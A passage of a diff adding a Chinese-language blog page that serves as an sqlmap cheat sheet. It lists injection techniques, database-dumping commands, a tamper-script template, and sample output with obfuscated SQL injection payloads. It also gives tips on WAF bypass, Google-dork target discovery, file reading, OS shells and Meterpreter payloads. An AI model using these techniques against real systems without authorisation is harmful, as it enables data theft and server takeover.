@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.0.0/css/all.min.css" integrity="sha256-jTIdiMuX/e3DGJUGwl3pKSxuc6YOuqtJYkM0bGQESA4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.10.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}}},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="可测试参数选项：-p，–skip 和 –param-exclude 默认情况下 sqlmap 会测试所有 GET 参数和 POST 参数。当 –level 的值 &gt;&#x3D; 2，它还会测试 HTTP Cookie 头部值。当这个值 &gt;&#x3D; 3 时，它还会测试 HTTP User-Agent 和 HTTP Referer 头部值。而且还可以手动指定一个需要 sqlmap 进行测试的、使用逗号分隔">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap">
+<meta property="og:url" content="http://example.com/2022/07/30/sqlmap/index.html">
+<meta property="og:site_name" content="b1ue0cean&#39;s   blog">
+<meta property="og:description" content="可测试参数选项：-p，–skip 和 –param-exclude 默认情况下 sqlmap 会测试所有 GET 参数和 POST 参数。当 –level 的值 &gt;&#x3D; 2，它还会测试 HTTP Cookie 头部值。当这个值 &gt;&#x3D; 3 时，它还会测试 HTTP User-Agent 和 HTTP Referer 头部值。而且还可以手动指定一个需要 sqlmap 进行测试的、使用逗号分隔">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-07-30T12:04:42.000Z">
+<meta property="article:modified_time" content="2022-07-30T12:21:24.985Z">
+<meta property="article:author" content="b1ue0cean">
+<meta property="article:tag" content="sqlmap">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2022/07/30/sqlmap/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/07/30/sqlmap/","path":"2022/07/30/sqlmap/","title":"sqlmap"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>sqlmap | b1ue0cean's   blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="b1ue0cean's   blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">b1ue0cean's   blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">welcome to my world -- sharing CTF & ML skills</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section">Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section">About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section">Tags<span class="badge">65</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section">Categories<span class="badge">48</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">96</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%AF%E6%B5%8B%E8%AF%95%E5%8F%82%E6%95%B0"><span class="nav-number">1.</span> <span class="nav-text">可测试参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E4%BC%9A%E7%94%A8%E5%88%B0%E7%9A%84sql%E6%8A%80%E6%9C%AF"><span class="nav-number">2.</span> <span class="nav-text">测试会用到的sql技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E5%93%AA%E6%89%93%E5%93%AA"><span class="nav-number">2.1.</span> <span class="nav-text">指哪打哪</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E8%84%9A%E6%9C%AC%E6%9D%A5%E6%B3%A8%E5%85%A5-tamper"><span class="nav-number">2.2.</span> <span class="nav-text">写脚本来注入 tamper</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#trick"><span class="nav-number">3.</span> <span class="nav-text">trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%93%8D"><span class="nav-number">4.</span> <span class="nav-text">实操</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%91%E6%B5%81%E9%87%8F%E5%8C%85"><span class="nav-number">5.</span> <span class="nav-text">跑流量包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#useful"><span class="nav-number">6.</span> <span class="nav-text">useful</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="b1ue0cean"
+      src="/uploads/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">b1ue0cean</p>
+  <div class="site-description" itemprop="description">我就是我，人间不一样的烟火</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">96</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">48</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">65</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/godrun666" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;godrun666" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1019076587@qq.com" title="E-Mail → mailto:1019076587@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/b1ue0cean7" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;b1ue0cean7" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_53755216" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_53755216" rel="noopener" target="_blank">CSDN</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/30/sqlmap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpeg">
+      <meta itemprop="name" content="b1ue0cean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="b1ue0cean's   blog">
+      <meta itemprop="description" content="我就是我，人间不一样的烟火">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="sqlmap | b1ue0cean's   blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sqlmap
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-07-30 20:04:42 / Modified: 20:21:24" itemprop="dateCreated datePublished" datetime="2022-07-30T20:04:42+08:00">2022-07-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sqlmap/" itemprop="url" rel="index"><span itemprop="name">sqlmap</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="可测试参数"><a href="#可测试参数" class="headerlink" title="可测试参数"></a>可测试参数</h2><p>选项：-p，–skip 和 –param-exclude</p>
+<p>默认情况下 sqlmap 会测试所有 GET 参数和 POST 参数。当 –level 的值 &gt;= 2，它还会测试 HTTP Cookie 头部值。当这个值 &gt;= 3 时，它还会测试 HTTP User-Agent 和 HTTP Referer 头部值。而且还可以手动指定一个需要 sqlmap 进行测试的、使用逗号分隔的参数列表。这会使 sqlmap 忽略 –level 的设置。<br>例如，只需要测试 GET 参数 id 和 HTTP User-Agent 时，则提供 -p “id,user-agent”。<br>如果用户想要排除测试某些参数，可以使用选项 –skip。如果需要使用高级别 –level 值，并指定部分可用参数（排除通常被测试的 HTTP 头）时，这个选项非常有用。<br>例如，要在 –level=5 跳过测试 HTTP User-Agent 和 HTTP Referer，可以提供 –skip=“user-agent,referer”。<br>还可以基于正则表达式针对参数名称来排除对某些参数的测试。在这种情况下，用户可以使用选项 –param-exclude。<br>例如，要跳过对名称中包含 token 或 session 的参数测试，可以提供 –param-exclude=”token|session”。</p>
+<h2 id="测试会用到的sql技术"><a href="#测试会用到的sql技术" class="headerlink" title="测试会用到的sql技术"></a>测试会用到的sql技术</h2><p>使用方法</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--technique<span class="operator">=</span></span><br></pre></td></tr></table></figure>
+
+
+<p>B：布尔型注入 Boolean-based blind<br>E：报错型注入 Error-based<br>U：联合查询注入 Union-query based<br>S：堆叠查询注入 Stacked queries<br>T：时间型盲注 Time-based blind<br>Q：内联查询注入 inline query</p>
+<h3 id="指哪打哪"><a href="#指哪打哪" class="headerlink" title="指哪打哪"></a>指哪打哪</h3><p>–dbs 爆出所有数据库<br>–tables 爆出所有的表<br>–columns 爆出所有的列<br>–current-db 查看当前数据库<br>-D xxx -T xxx –columns<br>-D xxx -T xxx -C username –dump<br>-D xxx -T xxx -C username –dump –start 1 –stop 100 爆出前100个数据<br>-T xxx –dump-all 爆出table中所有的东西<br>–dbms MYSQL 指定mysql数据库类型</p>
+<h3 id="写脚本来注入-tamper"><a href="#写脚本来注入-tamper" class="headerlink" title="写脚本来注入 tamper"></a>写脚本来注入 tamper</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Needed imports</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define which is the order of application of tamper scripts against</span></span><br><span class="line"><span class="comment"># the payload</span></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Description of your tamper script</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># your code to tamper the original payload</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># return the tampered payload</span></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;</span> --\</span><br><span class="line">tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v <span class="number">3</span></span><br><span class="line"></span><br><span class="line">[hh:mm:03] [DEBUG] cleaning up configuration parameters</span><br><span class="line">[hh:mm:03] [INFO] loading tamper script <span class="string">&#x27;between&#x27;</span></span><br><span class="line">[hh:mm:03] [INFO] loading tamper script <span class="string">&#x27;randomcase&#x27;</span></span><br><span class="line">[hh:mm:03] [INFO] loading tamper script <span class="string">&#x27;space2comment&#x27;</span></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:04] [INFO] testing <span class="string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[hh:mm:04] [PAYLOAD] <span class="number">1</span>)/**/And/**/<span class="number">1369</span>=<span class="number">7706</span>/**/And/**/(<span class="number">4092</span>=<span class="number">4092</span></span><br><span class="line">[hh:mm:04] [PAYLOAD] <span class="number">1</span>)/**/AND/**/<span class="number">9267</span>=<span class="number">9267</span>/**/AND/**/(<span class="number">4057</span>=<span class="number">4057</span></span><br><span class="line">[hh:mm:04] [PAYLOAD] <span class="number">1</span>/**/AnD/**/<span class="number">950</span>=<span class="number">7041</span></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:04] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line">[hh:mm:04] [PAYLOAD] <span class="number">1</span>/**/anD/**/(SELeCt/**/<span class="number">9921</span>/**/fROm(SELeCt/**/counT(*),CONC</span><br><span class="line">AT(cHar(<span class="number">58</span>,<span class="number">117</span>,<span class="number">113</span>,<span class="number">107</span>,<span class="number">58</span>),(SELeCt/**/(case/**/whEN/**/(<span class="number">9921</span>=<span class="number">9921</span>)/**/THeN/**/<span class="number">1</span>/</span><br><span class="line">**/elsE/**/<span class="number">0</span>/**/ENd)),cHar(<span class="number">58</span>,<span class="number">106</span>,<span class="number">104</span>,<span class="number">104</span>,<span class="number">58</span>),FLOOR(RanD(<span class="number">0</span>)*<span class="number">2</span>))x/**/fROm/**/info</span><br><span class="line">rmation_schema.tables/**/group/**/bY/**/x)a)</span><br><span class="line">[hh:mm:04] [INFO] GET parameter <span class="string">&#x27;id&#x27;</span> <span class="keyword">is</span> <span class="string">&#x27;MySQL &gt;= 5.0 AND error-based - WHERE or</span></span><br><span class="line"><span class="string"> HAVING clause&#x27;</span> injectable</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h2><p>在使用-v参数的时候，尽量选择，3级别，次级别可以显示注入的参数。 例如：sqlmap -v3 -u</p>
+<table>
+<thead>
+<tr>
+<th align="center"><strong>1</strong></th>
+<th align="center">在使用-v参数的时候，尽量选择，3级别，次级别可以显示注入的参数。 例如：sqlmap -v3 -u <a target="_blank" rel="noopener" href="http://www.potian.com/">www.potian.com</a></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>2</strong></td>
+<td align="center">当一件知道数据库信息的时候，使用-d直接连接数据库，注意-D是指定目标库，要区分。 例如：-d mysql://POTIAN : 123123 @127.0.0.1:3306/ ORDER</td>
+</tr>
+<tr>
+<td align="center"><strong>3</strong></td>
+<td align="center">当使用Burp或WebScarab保存了日志的时候，想从日志文件中筛选目标，可使用-I使用 绝对路径地址即可。</td>
+</tr>
+<tr>
+<td align="center"><strong>4</strong></td>
+<td align="center">-g可以使用google的搜索结果，例如，直接搜索uid=，查找具有此参数的站点，直接使用sqlmap调用google结果，例：<strong>sqlmap</strong>  -g inurl:php?uid=。（收集了一些语句，在附表）当需要使用-g inurl:php?uid=等参数时，默认无法访问，可使用此参数+海外代理方式使用此功能。当代理需要验证的时候，使用-cre指定身份信息，需要使用代理轮巡时，使用文件加载代理设置列表，使用代理轮询也可在对访问ip次数进行了验证的场景使用。（鉴于我国国情，不建议使用）</td>
+</tr>
+<tr>
+<td align="center"><strong>5</strong></td>
+<td align="center">服务端允许的情况下，–method改变默认的http方法，和其他参数配合使用，例如–data，改变为post然后推送数据。</td>
+</tr>
+<tr>
+<td align="center"><strong>6</strong></td>
+<td align="center">默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/<em>.</em>-dev-xxxxxxx(<a target="_blank" rel="noopener" href="http://sqlmap.org/">http://sqlmap.org</a>) 可以使用–user-agent参数来指定想使用的UA，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入.另外UA是绕过waf的参数，–user-agent=                –random-agent这两个参数可对waf针对恶意ua的防控进行绕过。</td>
+</tr>
+<tr>
+<td align="center"><strong>7</strong></td>
+<td align="center">指定http请求中的header里的host参数、在请求中伪造referer，有些waf和安全产品等会对refer进行限制，仅允许本站referer，当waf参数对referer进行了限制后，可使用此参数进行绕过。当–level参数设定为3或者3以上的时候会尝试对referer注入指定其他的header信息，XFF等，例如strust2-045使用了Content-Type</td>
+</tr>
+<tr>
+<td align="center"><strong>8</strong></td>
+<td align="center">HTTP代理身份验证凭据，可自动使用username：password和秘钥文件，例如有些访问会使用key文件，集团sso最爱出现此种场景，在这种身份验证凭据的需求中，也可使用-I参数使用burp等代理记录文件来使用身份凭据</td>
+</tr>
+<tr>
+<td align="center"><strong>9</strong></td>
+<td align="center">设置http请求间隔时间，在绕过需求时使用，例如单ip单位时间访问多少次，可配合代理和多代理参数使用。超时连接后的尝试间隔，默认30s，可手动调整，一般–timeout和–retries配合使用</td>
+</tr>
+<tr>
+<td align="center"><strong>10</strong></td>
+<td align="center">有的网站会对提交的参数进行编码或加密，这时候需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。 例子：–eval=””import hashlib;hash=hashlib.md5(id).hexdigest()””上面的请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值。”</td>
+</tr>
+<tr>
+<td align="center"><strong>11</strong></td>
+<td align="center">sqlmap默认测试所有的GET和POST参数，上文提到过，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，大于等于3的时候也会测试User-Agent和HTTP Referer头的值。这时候可以手动指定-p参数设置想要测试的参数。 例如：-p “”id,cookie””但是有个别参数不想测试的时候可以使用–skip=“user-agent”参数。</td>
+</tr>
+<tr>
+<td align="center"><strong>12</strong></td>
+<td align="center">数值处理：参数：–invalid-bignum –invalid-logical这两个参数对报错数据、无效数据进行更改，例如默认报错UID=-20,可以通过制定以上参数制定无效的大数字和逻辑，比如uid=999999999和uid=20 and a=b 参数：–prefix,–suffix在注入的payload的前面或者后面加一些字符，来保证payload的正常执行，例如在语句中增加–prefix “”’)”” –suffix “”AND (’1’=’1””</td>
+</tr>
+<tr>
+<td align="center"><strong>13</strong></td>
+<td align="center">–tamper可从tamper库里查找相关内容，使用–tamper tamper/*.py方式指定</td>
+</tr>
+<tr>
+<td align="center"><strong>14</strong></td>
+<td align="center">上文多次解释–level对测试参数的影响，一共有五个等级，默认为1，sqlmap使用的payload可以在payloads.xml中看到，你也可以根据相应的格式添加自己的payload内容，默认也有一些，可定制。 –level的值大于等于2的时候也会测试HTTP Cookie头的值，大于等于3的时候也会测试User-Agent和HTTP Referer头的值，建议最高级别，会更慢、测试参数更复杂。</td>
+</tr>
+<tr>
+<td align="center"><strong>15</strong></td>
+<td align="center">risk从0-3共有四个风险等级，默认是1，risk1会测试大部分的测试语句，risk2会增加基于事件的测试语句，3会增加OR语句的注入测试。测试的语句同样可以在payloads.xml中找到，可以自行添加payload。 警告：当使用高级别时，可能会使用drop、update等高危语句对整表、整库造成影响，可能导致更新的整个表，可能造成很大的风险。</td>
+</tr>
+<tr>
+<td align="center"><strong>16</strong></td>
+<td align="center">“sqlmap测试结果取决于返回内容，当页面在刷新或更新后，可能导致返回不同的内容，特别是页面有动态内容的情况下。为了避免误报，可指定字符串或者正则表达式来区分原始页面和报错页面（–string参数添加字符串，–regexp添加正则），也可以提供一段字符串在原始页面与true下的页面都不存在的字符串，而false页面中存在的字符串（–not-string添加）。 用户也可以提供true与false返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，–code=200。</td>
+</tr>
+<tr>
+<td align="center"><strong>17</strong></td>
+<td align="center">默认sqlmap会把BEUSTQ六中注入方式全来一遍，可根据实际情况进行调整，例如可使用时间延迟，看网站响应时间来判断是否有注入，可根据报错判断注入。如果不是很懂，就不用管，虽然时间长点，但很全面。  B:Boolean-based blind SQL injection（布尔型注入） E:Error-based SQL injection（报错型注入）  U:UNION query SQL injection（可联合查询注入）  S:Stacked queries SQL                injection（可多语句查询注入）  T: Time-based blind SQL injection（基于时间延迟注入）  Q: Inline SQL Injection (内联注入) 当使用基于时间延迟注入的盲注时，时刻使用–time-sec参数设定延时时间，默认是5秒，可以根据环境记性调整，比如网络延迟很大，可适当增加延时时间</td>
+</tr>
+<tr>
+<td align="center"><strong>18</strong></td>
+<td align="center">–union-cols设定的值为一段整数范围，制定区间，此数值默认为1-10，随着–levle增加，当为5的时候增加为50，当level级别和取值范围不匹配，在低级别需求更大的范围，可通过设定–union-cols的值来实现。设定union查询使用的字符，默认使用NULL，但是可能会返回失败，–union-char指定UNION查询的字符。指定查询的表，配合上文暴力破解的字符、范围等来详细使用。</td>
+</tr>
+<tr>
+<td align="center"><strong>19</strong></td>
+<td align="center">在一旦注入成功且获得精确信息通过以下详细参数来指定检索、枚举动作和动作执行对象：检索DBMS的指纹特征、数据库、host值、用户身份、并对用户、密码、权限、角色进行枚举也就是爆破。然后尝试枚举数据库、数据库里的表、数据库里的内容、可以使用count来统计条目等操作。dump和dump-all就是脱裤和全脱的区别，dump某表的十条八条可能没事儿，dump-all注定要浪迹天涯，也就是所谓的从脱裤到跑路的开始，通过-D-T-C来制定索要枚举的库、表、和列，使用-X来排除不想要的列，特别是有多列且有无意义字段的时候，使用-X可大大节省时间。                –exclude-sysdbs参数，将不会获取数据库自带的系统库内容，可减少干扰内容，对-count的使用和枚举信息的使用建议搭配此参数来排除系统库。 当我们不想跑路的时候，那么请使用下面内容：    –start=LIMITSTART First query output entry to retrieve指定从第几行开始输出，如： –start=1                   –stop=LIMITSTOP   Last query output entry to retrieve 指定从第几行停止输出 –stop=10  –first=FIRSTCHAR   First query output word character                to retrieve 指定从第几个字符开始输出 –first 1    –last=LASTCHAR Last query output word character to retrieve 指定从第几个字符停止输出–last10</td>
+</tr>
+<tr>
+<td align="center"><strong>20</strong></td>
+<td align="center">暴力检查：猜测检查常见的、通用的表名和列名，可通过下面两个文件进行定制化，暴力破解的表在txt/common-tables.txt文件中，暴力破解的列名在txt/common-columns.txt中</td>
+</tr>
+<tr>
+<td align="center"><strong>21</strong></td>
+<td align="center">对文件系统、操作系统的交互和使用必须需要相应的权限，前面提到要求具有特定的函数执行特权，一般要求root。针对文件系统的读写：对–file-read配置绝对系统路径，可读取相应文件内容，可以是文本，也可以是二进制，条件是必须拥有相对应特权，已知的是mysql、postgresql和sqlserver。写入也是同样，往远端后台的DBMS里写入一个本地文件，可通过–file-dest指定绝对文件路径。” 当然和上面可以配合使用，当数据库为MySQL，PostgreSQL或Microsoft                SQL Server，并且当前用户有权限使用特定的函数。然后通过上面的文件系统管理上传一个库，使用可执行系统命令的sys_exec()和sys_eval()，甚至xp_cmdshell存储过程 –os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。 Meterpreter配合使用 –os-pwn，–os-smbrelay，–os-bof，–priv-esc，–msf-path，–tmp-path配合Meterpreter使用，当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立TCP连接，这个连接可以是一个交互式命令行的Meterpreter会话，sqlmap根据Metasploit生成shellcode，四种方式执行它：  1.通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：–os-pwn。  2.通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft                SQL Server的xp_cmdshell()函数，参数：–os-pwn。 3.通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），–os-smbrelay。 4.通过溢出Microsoft SQL Server 2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：–os-bof。</td>
+</tr>
+<tr>
+<td align="center"><strong>22</strong></td>
+<td align="center">所见即所得，注册表连接指的是windows系统，相信大家都有windows系统知识，不懂注册表基本就不懂windows系统，所有的windows系统配置在注册表里都可实现，比如开启远程连接、比如新建用户、比如组策略配置、比如防火墙等等，reg可对注册表内容进行读取、编辑、和删除，上面和下面相配合可实现对指定的key、value、data和类型进行操作。</td>
+</tr>
+<tr>
+<td align="center"><strong>23</strong></td>
